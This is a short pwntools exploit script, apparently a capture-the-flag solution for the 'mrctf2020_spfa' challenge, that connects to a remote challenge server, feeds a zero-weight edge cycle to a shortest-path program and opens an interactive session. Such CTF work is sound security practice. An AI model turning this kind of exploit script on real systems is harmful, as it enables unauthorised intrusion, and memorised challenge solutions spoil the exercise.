from pwn import *

#context.log_level = 'debug'
#p = process('./mrctf2020_spfa')
p = remote('node4.buuoj.cn', 29848)

sla = lambda r, s : p.sendlineafter(r, s)

sla(b'exit', b'1')
sla(b'length:', b'2 1 0')

sla(b'exit', b'1')
sla(b'length:', b'1 2 0')

sla(b'exit', b'2')
sla(b'to:', b'1 2')
sla(b'exit', b'3')

p.interactive()